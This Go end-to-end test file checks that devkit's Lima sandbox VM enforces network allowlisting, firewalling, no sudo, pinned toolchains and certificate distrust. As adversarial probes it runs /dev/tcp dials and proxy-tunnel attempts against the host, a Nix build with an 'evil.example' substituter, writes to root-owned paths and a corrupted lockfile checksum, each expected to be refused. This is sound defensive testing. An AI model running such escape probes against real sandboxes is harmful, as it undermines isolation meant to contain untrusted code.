// Package e2e creates a real sandbox VM and checks devkit's guarantees.
//
// Run with: DEVKIT_E2E=1 go test ./tests/e2e/ -v -timeout 30m
// The first run downloads an Ubuntu image and takes several minutes.
package e2e

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

func repoRootDir(t *testing.T) string {
	_, file, _, _ := runtime.Caller(0)
	return filepath.Dir(filepath.Dir(filepath.Dir(file)))
}

func buildDevkitBinary(t *testing.T) string {
	t.Helper()
	root := repoRootDir(t)
	bin := filepath.Join(t.TempDir(), "devkit")
	cmd := exec.Command("make", "-s", "build")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("make build: %v\n%s", err, out)
	}
	if err := os.Rename(filepath.Join(root, "devkit"), bin); err != nil {
		t.Fatal(err)
	}
	return bin
}

type sandbox struct {
	t      *testing.T
	devkit string
	dir    string
	name   string
}

func (s *sandbox) run(args ...string) (string, error) {
	cmd := exec.Command(s.devkit, args...)
	cmd.Dir = s.dir
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	s.t.Logf("$ devkit %s\n%s", strings.Join(args, " "), out.String())
	return out.String(), err
}

func (s *sandbox) mustRun(args ...string) string {
	out, err := s.run(args...)
	if err != nil {
		s.t.Fatalf("devkit %s failed: %v", strings.Join(args, " "), err)
	}
	return out
}

// shell runs a command in the VM and returns combined output and error.
func (s *sandbox) shell(cmd string) (string, error) {
	return s.run("shell", cmd)
}

func TestSandboxGuarantees(t *testing.T) {
	if os.Getenv("DEVKIT_E2E") == "" {
		t.Skip("set DEVKIT_E2E=1 to run (creates a real VM)")
	}
	if _, err := exec.LookPath("limactl"); err != nil {
		t.Skip("limactl not installed")
	}

	devkit := buildDevkitBinary(t)
	dir := t.TempDir()
	name := fmt.Sprintf("e2e-%d", time.Now().Unix()%100000)
	s := &sandbox{t: t, devkit: devkit, dir: dir, name: name}

	// A tiny Node project with one dependency.
	writeFile(t, filepath.Join(dir, "package.json"), `{"name":"e2e","version":"1.0.0","dependencies":{"is-odd":"3.0.1"}}`)
	writeFile(t, filepath.Join(dir, "secret.txt"), "copied-marker")

	s.mustRun("init", "--name", name)
	t.Cleanup(func() {
		_, _ = s.run("rm", "--force")
	})
	// A listener on the Mac that the VM can only reach when the policy says
	// so: the positive control for every "host unreachable" assertion below.
	// Lima routes host.lima.internal to the host's loopback.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	hostPort := ln.Addr().(*net.TCPAddr).Port
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			_, _ = c.Write([]byte("devkit-host-listener\n"))
			c.Close()
		}
	}()
	// --noproxy '' so NO_PROXY (which lists the host under allow_host) cannot
	// turn the tunnel check into a bypass.
	hostTunnel := fmt.Sprintf("curl -s -m 10 -p -x http://127.0.0.1:3128 --noproxy '' -o /dev/null -w '%%{http_connect}' https://host.lima.internal:%d/ ; echo", hostPort)
	hostDirect := fmt.Sprintf("timeout 5 bash -c 'exec 3<>/dev/tcp/host.lima.internal/%d && head -c 20 <&3' 2>&1; echo exit=$?", hostPort)

	start := time.Now()
	upOut := s.mustRun("up")
	t.Logf("devkit up took %s", time.Since(start).Round(time.Second))
	// Steps that fail soft say so on stderr; none may, or a green run proves
	// less than it claims (a DNS stub switched off too early once hid a
	// failed ca-certificates refresh this way).
	if strings.Contains(upOut, "devkit: could not") {
		t.Fatalf("devkit up reported a failed step:\n%s", upOut)
	}

	t.Run("workspace copied and deps installed", func(t *testing.T) {
		out, err := s.shell("cat secret.txt && test -d node_modules/is-odd && node --version")
		if err != nil || !strings.Contains(out, "copied-marker") || !strings.Contains(out, "v22.") {
			t.Fatalf("workspace or node missing: %v\n%s", err, out)
		}
	})

	t.Run("toolchain lockfile recorded and enforced", func(t *testing.T) {
		lock, err := s.shell("cat ~/.config/mise/mise.lock")
		if err != nil || !strings.Contains(lock, "[[tools.node]]") || !strings.Contains(lock, "checksum = \"sha256:") {
			t.Fatalf("first up should record node's checksum in the VM's mise.lock: %v\n%s", err, lock)
		}
		if _, err := os.Stat(filepath.Join(dir, ".devkit")); err == nil {
			t.Fatal("nothing from the VM may land on the host, not even the lockfile")
		}
		out := s.mustRun("up", "--no-sync", "--no-install")
		if !strings.Contains(out, "pinned by the VM's mise.lock") {
			t.Fatalf("second up should install from the lockfile:\n%s", out)
		}
		// The sandbox user cannot loosen the manager's settings: they are
		// root-owned, and plugin backends stay off.
		out, _ = s.shell("mise settings get disable_backends; mise settings get paranoid; ls -l /etc/mise/config.toml")
		if !strings.Contains(out, "asdf") || !strings.Contains(out, "true") || !strings.Contains(out, "root root") {
			t.Fatalf("mise settings should be pinned by root: %s", out)
		}
	})

	// Adversarial: code in the sandbox, or a hostile repo, tries to get a
	// toolchain in that was not pinned, verified or allowed.
	t.Run("mismatching checksum in the lockfile is refused", func(t *testing.T) {
		// A download whose hash differs from the lock must not be installed,
		// whether the lock was corrupted or upstream changed the archive.
		s.mustRun("shell", "cp ~/.config/mise/mise.lock ~/mise.lock.orig && sed -i -E 's/sha256:[0-9a-f]{64}/sha256:"+strings.Repeat("0", 64)+"/' ~/.config/mise/mise.lock && mise uninstall --all node")
		out, err := s.run("up", "--no-sync", "--no-install")
		if err == nil {
			t.Fatalf("up should fail when the download does not match the lock:\n%s", out)
		}
		if o, _ := s.shell("command -v node || echo no-node"); !strings.Contains(o, "no-node") {
			t.Fatalf("node must not be installed from a mismatching checksum: %s", o)
		}
		s.mustRun("shell", "mv ~/mise.lock.orig ~/.config/mise/mise.lock")
		s.mustRun("up", "--no-sync", "--no-install")
		if o, _ := s.shell("node --version"); !strings.Contains(o, "v22.") {
			t.Fatalf("node should come back with the genuine lockfile: %s", o)
		}
	})

	t.Run("sandbox cannot change the manager or its policy", func(t *testing.T) {
		out, _ := s.shell("touch /etc/mise/config.toml 2>&1; cp /bin/true /usr/local/bin/mise 2>&1; echo exit=$?")
		if strings.Count(out, "Permission denied") != 2 || !strings.Contains(out, "exit=1") {
			t.Fatalf("manager binary and settings should be root-only: %s", out)
		}
	})

	t.Run("plugin backends in a repo config are refused", func(t *testing.T) {
		out, _ := s.shell(`printf '[tools]\n"asdf:mise-plugins/mise-jq" = "latest"\n' > mise.toml; mise install 2>&1; echo exit=$?; rm -f mise.toml; ls "$HOME/.local/share/mise/plugins" 2>/dev/null | wc -l`)
		if strings.Contains(out, "exit=0") || !strings.HasSuffix(strings.TrimSpace(out), "0") {
			t.Fatalf("asdf plugin should be refused and nothing cloned: %s", out)
		}
	})

	t.Run("toolchain from a host outside the allowlist is blocked", func(t *testing.T) {
		out, _ := s.shell("mise install zig@0.14.0 2>&1 | tail -n 5; echo exit=${PIPESTATUS[0]}")
		if strings.Contains(out, "exit=0") {
			t.Fatalf("zig should not install: ziglang.org is not allowed: %s", out)
		}
		if logs := s.mustRun("logs"); !strings.Contains(logs, "BLOCKED") || !strings.Contains(logs, "ziglang.org") {
			t.Fatalf("the blocked download should be in the audit log:\n%s", logs)
		}
	})

	t.Run("escape attempts", func(t *testing.T) { escapeAttempts(t, s, dir) })
	t.Run("hardening", func(t *testing.T) { hardeningAttempts(t, s, dir) })

	t.Run("trust audit runs and reads the reference store", func(t *testing.T) {
		out, _ := s.run("audit")
		for _, want := range []string{"reference: Mozilla root store", "system bundle:", "node bundled roots", "unused: NODE_OPTIONS=--use-openssl-ca", "project files:"} {
			if !strings.Contains(out, want) {
				t.Errorf("audit output missing %q:\n%s", want, out)
			}
		}
		// A fresh VM has nothing stale: Node is on the system store and the
		// system bundle is the distro's current one.
		if !strings.Contains(out, "Nothing stale.") {
			t.Fatalf("a fresh VM should audit clean:\n%s", out)
		}
	})

	t.Run("trust settings reach non-login sessions", func(t *testing.T) {
		// Not through devkit shell (bash -l): a bare ssh command, as an IDE's
		// remote server or `ssh vm node ...` would run, gets them from
		// /etc/environment via PAM.
		cmd := exec.Command("limactl", "shell", "devkit-"+name, "--", "sh", "-c", "echo SSL=$SSL_CERT_FILE NODE=$NODE_OPTIONS")
		out, err := cmd.CombinedOutput()
		if err != nil || !strings.Contains(string(out), "SSL=/etc/ssl/certs/ca-certificates.crt NODE=--use-openssl-ca") {
			t.Fatalf("non-login session should carry the trust settings: %v\n%s", err, out)
		}
	})

	t.Run("distrusted root is rejected by curl and node", func(t *testing.T) {
		// objects.githubusercontent.com is on the allowlist and chains to
		// Let's Encrypt. Distrust both ISRG roots and the TLS handshake must
		// fail for every client on the system store, Node included.
		setYAML(t, filepath.Join(dir, "devkit.yaml"), "allow_host: false", "allow_host: false\n  distrust: [ISRG Root X1, ISRG Root X2]")
		s.mustRun("up", "--no-sync", "--no-install")
		out, _ := s.shell("curl -sS -m 15 -o /dev/null https://objects.githubusercontent.com/ 2>&1; echo exit=$?")
		if !strings.Contains(out, "certificate") || strings.Contains(out, "exit=0") {
			t.Fatalf("curl should fail certificate verification under distrust: %s", out)
		}
		// Node through the proxy as a CONNECT tunnel, so the only way to fail
		// is certificate verification: a direct fetch would be rejected by the
		// firewall and prove nothing about Node's trust store.
		s.mustRun("shell", "cat > ~/tlsprobe.js <<'EOF'\n"+nodeTLSProbe+"\nEOF")
		out, _ = s.shell("node ~/tlsprobe.js")
		if !strings.Contains(out, "failed: UNABLE_TO_GET_ISSUER_CERT_LOCALLY") && !strings.Contains(out, "failed: SELF_SIGNED_CERT_IN_CHAIN") {
			t.Fatalf("node should fail certificate verification under distrust: %s", out)
		}
		out, _ = s.shell("grep -c '^!mozilla/ISRG' /etc/ca-certificates.conf; devkit-audit | grep -c 'distrusted by devkit.yaml'")
		if !strings.HasPrefix(strings.TrimSpace(out), "2") {
			t.Fatalf("both roots should be marked in ca-certificates.conf: %s", out)
		}
		setYAML(t, filepath.Join(dir, "devkit.yaml"), "\n  distrust: [ISRG Root X1, ISRG Root X2]", "")
		s.mustRun("up", "--no-sync", "--no-install")
		out, _ = s.shell("curl -s -m 15 -o /dev/null -w '%{http_code}' https://objects.githubusercontent.com/; echo; grep -c '^!mozilla/ISRG' /etc/ca-certificates.conf; true")
		if strings.Contains(out, "000") || !strings.Contains(out, "\n0\n") {
			t.Fatalf("removing the distrust entries should restore trust and clear the conf: %s", out)
		}
		if out, _ = s.shell("node ~/tlsprobe.js"); !strings.Contains(out, "ok authorized=true") {
			t.Fatalf("node should verify again once trust is restored: %s", out)
		}
	})

	t.Run("no sudo", func(t *testing.T) {
		out, err := s.shell("sudo -n true 2>&1; echo exit=$?")
		if err != nil || !strings.Contains(out, "exit=1") {
			t.Fatalf("sudo should be unavailable: %v\n%s", err, out)
		}
	})

	t.Run("host unreachable", func(t *testing.T) {
		// Direct: the firewall must reject it. Via proxy: the allowlist must block it.
		out, _ := s.shell("curl -s -m 5 --noproxy '*' -o /dev/null -w '%{http_code}' http://host.lima.internal:2222/ ; echo exit=$?")
		if !strings.Contains(out, "exit=7") && !strings.Contains(out, "exit=28") {
			t.Fatalf("direct connection to host should be refused: %s", out)
		}
		out, _ = s.shell("curl -s -m 5 -o /dev/null -w '%{http_code}' http://host.lima.internal:2222/ ; echo exit=$?")
		if !strings.Contains(out, "403") {
			t.Fatalf("proxied connection to host should be blocked: %s", out)
		}
		// The listener is really there (allow_host proves that below), yet
		// neither a direct dial nor a CONNECT tunnel through the proxy gets it.
		if out, _ = s.shell(hostDirect); strings.Contains(out, "devkit-host-listener") {
			t.Fatalf("direct dial reached the host listener: %s", out)
		}
		if out, _ = s.shell(hostTunnel); strings.TrimSpace(out) != "403" {
			t.Fatalf("CONNECT to the host should be refused by policy (403): %s", out)
		}
	})

	t.Run("allowlist blocks and logs", func(t *testing.T) {
		out, _ := s.shell("curl -s -m 10 -o /dev/null -w '%{http_code}' https://example.com/ ; echo exit=$?")
		if strings.Contains(out, "200") {
			t.Fatalf("example.com should be blocked: %s", out)
		}
		out, _ = s.shell("curl -s -m 10 -o /dev/null -w '%{http_code}' https://registry.npmjs.org/is-odd ; echo exit=$?")
		if !strings.Contains(out, "200") {
			t.Fatalf("registry.npmjs.org should be allowed: %s", out)
		}
		logs := s.mustRun("logs")
		if !strings.Contains(logs, "BLOCKED") || !strings.Contains(logs, "example.com") {
			t.Fatalf("audit log should record the block:\n%s", logs)
		}
	})

	t.Run("direct connections bypassing the proxy are rejected", func(t *testing.T) {
		out, _ := s.shell("curl -s -m 10 --noproxy '*' -o /dev/null -w '%{http_code}' https://registry.npmjs.org/ ; echo exit=$?")
		if strings.Contains(out, "200") {
			t.Fatalf("firewall should reject traffic not from the proxy: %s", out)
		}
	})

	t.Run("host proxy never enters the guest and the environment file is stable", func(t *testing.T) {
		// Lima would copy a proxy from limactl's environment into its block
		// in /etc/environment, behind devkit's own settings, and the block
		// would then differ on every boot. Reboot with one set and check
		// that the file is byte-identical and the block carries no proxy.
		// up alone would leave a running VM with an unchanged config as it
		// is, so stop it first and prove the reboot happened by the boot id.
		before, _ := s.shell("md5sum /etc/environment")
		boot, _ := s.shell("cat /proc/sys/kernel/random/boot_id")
		s.mustRun("down")
		for _, k := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
			t.Setenv(k, "http://host-proxy.invalid:3128")
		}
		s.mustRun("up", "--no-sync", "--no-install")
		if b, _ := s.shell("cat /proc/sys/kernel/random/boot_id"); b == boot || strings.TrimSpace(b) == "" {
			t.Fatalf("VM did not reboot (boot_id %q then %q)", strings.TrimSpace(boot), strings.TrimSpace(b))
		}
		after, _ := s.shell("md5sum /etc/environment")
		if before != after || !strings.Contains(before, "/etc/environment") {
			t.Fatalf("/etc/environment changed across a reboot with a host proxy set:\n%s\n%s", before, after)
		}
		// Proxy assignments by key, not any mention of "proxy": Lima also
		// merges unrelated global env entries into this block.
		out, _ := s.shell("sed -n '/^#LIMA-START/,/^#LIMA-END/p' /etc/environment | grep -ciE '^(https?_proxy|ftp_proxy|no_proxy|all_proxy)='; true")
		if strings.TrimSpace(out) != "0" {
			t.Fatalf("Lima's block should carry no proxy settings: %s", out)
		}
		if out, _ = s.shell("grep -c '^HTTPS_PROXY=http://127.0.0.1:3128$' /etc/environment; true"); strings.TrimSpace(out) != "1" {
			t.Fatalf("devkit's own proxy line should be present once: %s", out)
		}
	})

	t.Run("open mode is still audited", func(t *testing.T) {
		s.mustRun("up", "--network", "open", "--no-sync", "--no-install")
		out, _ := s.shell("curl -s -m 10 -o /dev/null -w '%{http_code}' https://example.com/ ; echo exit=$?")
		if !strings.Contains(out, "200") {
			t.Fatalf("open mode should allow example.com via the proxy: %s", out)
		}
		out, _ = s.shell("curl -s -m 10 --noproxy '*' -o /dev/null -w '%{http_code}' https://example.com/ ; echo exit=$?")
		if strings.Contains(out, "200") {
			t.Fatalf("open mode must reject connections that bypass the proxy: %s", out)
		}
		// The proxy allows every host in open mode, so it will try the Mac
		// itself. The firewall must reject the proxy's dial: CONNECT answers
		// 502 before any tunnel exists, never 200. A plain-HTTP 502 would not
		// do, since the proxy also sends one after reaching a non-HTTP
		// listener and failing to parse its reply.
		// On the listener's port the port policy answers first: 403, since
		// open mode still means web ports only. On 443 the policy allows the
		// dial and the firewall must reject it: 502, never 200.
		if out, _ = s.shell(hostTunnel); strings.TrimSpace(out) != "403" {
			t.Fatalf("open mode: CONNECT to a non-web port must be refused by policy (403), got: %s", out)
		}
		if out, _ = s.shell("curl -s -m 10 -p -x http://127.0.0.1:3128 --noproxy '' -o /dev/null -w '%{http_connect}' https://host.lima.internal:443/ ; echo"); strings.TrimSpace(out) != "502" {
			t.Fatalf("open mode must not let the proxy tunnel to the host on 443; want 502, got: %s", out)
		}
		if out, _ = s.shell(hostDirect); strings.Contains(out, "devkit-host-listener") {
			t.Fatalf("open mode: direct dial reached the host listener: %s", out)
		}
		// Port 53 is not a loophole: only the resolvers accept it.
		out, _ = s.shell("timeout 5 bash -c 'exec 3<>/dev/tcp/1.1.1.1/53' 2>&1; echo exit=$?")
		if strings.Contains(out, "exit=0") {
			t.Fatalf("direct TCP to port 53 on an arbitrary host should be rejected: %s", out)
		}
		if logs := s.mustRun("logs"); !strings.Contains(logs, "ALLOWED") || !strings.Contains(logs, "example.com") {
			t.Fatalf("audit log should record the allowed request:\n%s", logs)
		}
	})

	t.Run("allow_host opens the host", func(t *testing.T) {
		// Back on allowlist mode: the subtest before this one left the VM
		// open. Reset in a cleanup so a failure here cannot leak allow_host
		// into the air-gap subtest, where it would open DNS to the host.
		setYAML(t, filepath.Join(dir, "devkit.yaml"), "allow_host: false", "allow_host: true")
		t.Cleanup(func() { setYAML(t, filepath.Join(dir, "devkit.yaml"), "allow_host: true", "allow_host: false") })
		s.mustRun("up", "--network", "allowlist", "--no-sync", "--no-install")
		out, _ := s.shell("timeout 5 bash -c 'exec 3<>/dev/tcp/host.lima.internal/2222' 2>&1; echo exit=$?")
		if !strings.Contains(out, "exit=0") {
			t.Fatalf("host should be reachable with allow_host: %s", out)
		}
		// Positive control: the listener the earlier subtests could not
		// reach answers now, so their failures were the policy, not a dead port.
		if out, _ = s.shell(hostDirect); !strings.Contains(out, "devkit-host-listener") {
			t.Fatalf("allow_host should reach the host listener: %s", out)
		}
		// Forced through the proxy, the allowlist still refuses the host.
		if out, _ = s.shell(hostTunnel); strings.TrimSpace(out) != "403" {
			t.Fatalf("CONNECT to the host via the proxy should still be 403 under allow_host: %s", out)
		}
		out, _ = s.shell("echo $NO_PROXY")
		if !strings.Contains(out, "host.lima.internal") {
			t.Fatalf("host should bypass the proxy with allow_host: %s", out)
		}
	})

	t.Run("air gap", func(t *testing.T) {
		s.mustRun("up", "--network", "none", "--no-sync", "--no-install")
		out, _ := s.shell("curl -s -m 10 -o /dev/null -w '%{http_code}' https://registry.npmjs.org/ ; echo exit=$?")
		if strings.Contains(out, "200") {
			t.Fatalf("air-gapped VM reached the internet: %s", out)
		}
		out, _ = s.shell("getent hosts example.com; echo exit=$?")
		if strings.Contains(out, "exit=0") {
			t.Fatalf("DNS should fail when air-gapped: %s", out)
		}
	})
}

// TestNixToolchain builds a second VM with manager: nix. It downloads Nix
// and a nodejs closure from cache.nixos.org, so it is gated separately.
func TestNixToolchain(t *testing.T) {
	if os.Getenv("DEVKIT_E2E_NIX") == "" {
		t.Skip("set DEVKIT_E2E_NIX=1 to run (creates a real VM and installs Nix)")
	}
	if _, err := exec.LookPath("limactl"); err != nil {
		t.Skip("limactl not installed")
	}
	devkit := buildDevkitBinary(t)
	dir := t.TempDir()
	name := fmt.Sprintf("e2enix-%d", time.Now().Unix()%100000)
	s := &sandbox{t: t, devkit: devkit, dir: dir, name: name}
	writeFile(t, filepath.Join(dir, "package.json"), `{"name":"e2e","version":"1.0.0","dependencies":{"is-odd":"3.0.1"}}`)
	writeFile(t, filepath.Join(dir, ".nvmrc"), "22\n")

	s.mustRun("init", "--name", name, "--toolchain", "nix")
	t.Cleanup(func() { _, _ = s.run("rm", "--force") })
	if flake, err := os.ReadFile(filepath.Join(dir, "flake.nix")); err != nil || !strings.Contains(string(flake), "nodejs_22") {
		t.Fatalf("init should write a flake with the detected node: %v\n%s", err, flake)
	}

	start := time.Now()
	upOut := s.mustRun("up")
	t.Logf("devkit up took %s", time.Since(start).Round(time.Second))
	// Steps that fail soft say so on stderr; none may, or a green run proves
	// less than it claims (a DNS stub switched off too early once hid a
	// failed ca-certificates refresh this way).
	if strings.Contains(upOut, "devkit: could not") {
		t.Fatalf("devkit up reported a failed step:\n%s", upOut)
	}

	if _, err := os.Stat(filepath.Join(dir, "flake.lock")); err == nil {
		t.Fatal("nothing from the VM may land on the host, not even flake.lock")
	}
	if out, err := s.shell("test -s flake.lock && echo locked-in-vm"); err != nil || !strings.Contains(out, "locked-in-vm") {
		t.Fatalf("the evaluation should have written flake.lock inside the VM: %v %s", err, out)
	}
	out, err := s.shell("node --version && test -d node_modules/is-odd && echo deps-ok")
	if err != nil || !strings.Contains(out, "v22.") || !strings.Contains(out, "deps-ok") {
		t.Fatalf("node from the dev shell and deps expected: %v\n%s", err, out)
	}
	// Outside the dev shell there is no node: the toolchain lives in the store.
	out, _ = s.run("shell", "bash", "-c", "'command -v node || echo no-node'")
	if !strings.Contains(out, "node") {
		t.Fatalf("unexpected: %s", out)
	}
	logs := s.mustRun("logs")
	if !strings.Contains(logs, "cache.nixos.org") {
		t.Fatalf("nix downloads should go through the audited proxy:\n%s", logs)
	}
	out, _ = s.shell("sudo -n true 2>&1; echo exit=$?")
	if !strings.Contains(out, "exit=1") {
		t.Fatalf("sudo should be unavailable: %s", out)
	}

	// Adversarial: the sandbox tries to get around the store, the daemon's
	// policy and the allowlist.
	t.Run("store and daemon config are read-only", func(t *testing.T) {
		out, _ := s.shell("touch /nix/store/pwn 2>&1; touch /etc/nix/nix.conf 2>&1; echo exit=$?")
		if strings.Count(out, "Permission denied") != 2 {
			t.Fatalf("the store and nix.conf should be root-only: %s", out)
		}
	})

	t.Run("untrusted substituter is ignored", func(t *testing.T) {
		out, _ := s.shell(`nix build --no-link --impure --substituters https://evil.example --expr 'derivation { name = "x"; system = builtins.currentSystem; builder = "/bin/sh"; args = ["-c" "echo > $out"]; }' 2>&1; echo exit=$?`)
		if !strings.Contains(out, "untrusted substituter") {
			t.Fatalf("the daemon should refuse a substituter from a non-trusted user: %s", out)
		}
	})

	t.Run("fetch outside the allowlist is blocked", func(t *testing.T) {
		out, _ := s.shell(`nix eval --impure --expr 'builtins.fetchurl "https://example.com/"' 2>&1 | tail -n 3; echo exit=${PIPESTATUS[0]}`)
		if strings.Contains(out, "exit=0") {
			t.Fatalf("example.com is not allowed: %s", out)
		}
		if logs := s.mustRun("logs"); !strings.Contains(logs, "BLOCKED") || !strings.Contains(logs, "example.com") {
			t.Fatalf("the blocked fetch should be in the audit log:\n%s", logs)
		}
	})

	t.Run("wrong hash is refused", func(t *testing.T) {
		out, _ := s.shell(`nix eval --expr 'builtins.fetchurl { url = "https://nodejs.org/dist/index.json"; sha256 = "0000000000000000000000000000000000000000000000000000"; }' 2>&1 | tail -n 3; echo exit=${PIPESTATUS[0]}`)
		if strings.Contains(out, "exit=0") || !strings.Contains(out, "hash mismatch") {
			t.Fatalf("a fixed-output fetch with the wrong hash must fail: %s", out)
		}
	})
}

// nodeTLSProbe opens a CONNECT tunnel through the egress proxy and runs a TLS
// handshake over it with Node's own verifier, printing the error code.
const nodeTLSProbe = `const net = require('net'), tls = require('tls');
const host = 'objects.githubusercontent.com';
setTimeout(() => { console.log('timeout'); process.exit(); }, 20000);
const s = net.connect(3128, '127.0.0.1', () => s.write('CONNECT ' + host + ':443 HTTP/1.1\r\nHost: ' + host + ':443\r\n\r\n'));
// Buffer the whole CONNECT response: one data event may hold part of the
// status line, or the headers plus the first TLS bytes, which go back.
let buf = Buffer.alloc(0);
const onData = d => {
  buf = Buffer.concat([buf, d]);
  const end = buf.indexOf('\r\n\r\n');
  if (end < 0) return;
  s.removeListener('data', onData);
  const head = buf.subarray(0, end).toString(), rest = buf.subarray(end + 4);
  if (!/^HTTP\/1\.[01] 200 /.test(head)) { console.log('tunnel: ' + head.split('\r\n')[0]); process.exit(); }
  if (rest.length) s.unshift(rest);
  const t = tls.connect({ socket: s, servername: host }, () => { console.log('ok authorized=' + t.authorized); process.exit(); });
  t.on('error', e => { console.log('failed: ' + e.code); process.exit(); });
};
s.on('data', onData);
s.on('error', e => { console.log('proxy: ' + e.code); process.exit(); });`

// setYAML replaces one line fragment in devkit.yaml in place.
func setYAML(t *testing.T, path, from, to string) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), from) {
		t.Fatalf("%s does not contain %q", path, from)
	}
	writeFile(t, path, strings.Replace(string(data), from, to, 1))
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
